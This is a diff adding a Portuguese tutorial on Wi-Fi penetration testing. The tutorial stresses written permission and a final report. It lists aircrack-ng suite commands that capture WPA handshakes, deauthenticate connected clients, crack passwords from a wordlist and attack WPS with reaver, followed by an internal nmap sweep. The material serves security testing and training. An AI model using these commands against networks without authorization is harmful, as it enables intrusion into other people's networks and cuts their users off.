@@ -1,0 +1,56 @@
+Passo a Passo Detalhado para Fazer um Pentest em Redes Wi-Fi
+Realizar um teste de penetração (pentest) em redes Wi-Fi é um processo técnico e complexo que requer conhecimento avançado de redes e segurança cibernética. 
+Este guia detalhado vai te ajudar a realizar um pentest em redes Wi-Fi de maneira ética e legal.
+1. Preparação
+Conhecimento: Certifique-se de ter um bom entendimento de redes Wi-Fi, segurança de redes e ferramentas de pentest.
+Permissão: Obtenha autorização por escrito para testar a rede Wi-Fi.
+Ambiente de Teste: Prepare um ambiente de teste controlado, se possível, para evitar qualquer impacto na rede de produção.
+2. Ferramentas Necessárias
+Hardware:
+Um computador com uma distribuição Linux especializada em segurança (ex: Kali Linux).
+Um adaptador Wi-Fi USB compatível com modo monitor (ex: Alfa AWUS036NHA).
+Software:
+Kali Linux ou outra distribuição Linux com ferramentas de segurança.
+Ferramentas específicas como aircrack-ng, reaver, Wifite, e Wireshark.
+3. Configuração Inicial
+Instalar Kali Linux: Se ainda não tiver, instale o Kali Linux em seu computador ou use uma máquina virtual.
+Atualizar Ferramentas: Certifique-se de que todas as ferramentas estão atualizadas.
+
+sudo apt-get update
+sudo apt-get upgrade
+4. Reconhecimento da Rede
+Habilitar Modo Monitor: Coloque seu adaptador Wi-Fi em modo monitor.
+
+sudo airmon-ng start wlan0
+Escanear Redes: Use airodump-ng para escanear todas as redes Wi-Fi ao redor.
+
+sudo airodump-ng wlan0mon
+Identificar Alvos: Anote as informações das redes alvo, como ESSID (nome da rede), BSSID (endereço MAC) e canal.
+5. Captura de Handshake
+Capturar Handshake: Intercepte o handshake WPA/WPA2 das redes alvo.
+
+sudo airodump-ng --channel [canal] --bssid [BSSID] -w capture wlan0mon
+Desautenticar Clientes: Forçar a desautenticação de clientes conectados para capturar o handshake.
+
+sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
+6. Quebrar Senhas
+Usar aircrack-ng: Quebre a senha da rede usando o arquivo de captura.
+
+sudo aircrack-ng -w [lista_de_senhas] -b [BSSID] capture-01.cap
+7. Ataques WPS
+Usar Reaver: Se a rede alvo tiver WPS habilitado, tente explorar essa vulnerabilidade.
+
+sudo reaver -i wlan0mon -b [BSSID] -vv
+8. Análise de Tráfego
+Capturar Tráfego: Utilize Wireshark para analisar o tráfego da rede.
+
+sudo wireshark
+Identificar Vulnerabilidades: Procure por tráfego não criptografado, dados sensíveis, etc.
+9. Exploração
+Acesso à Rede: Uma vez conectada à rede, faça um reconhecimento interno para descobrir dispositivos e serviços.
+Escanear Dispositivos Internos: Use nmap para escanear dispositivos e identificar vulnerabilidades.
+
+sudo nmap -sP 192.168.1.0/24
+10. Relatório
+Documentação: Documente todos os passos, ferramentas usadas, vulnerabilidades encontradas e sugestões de mitigação.
+Relatório Final: Crie um relatório claro e detalhado para apresentar ao cliente ou responsável pela rede.
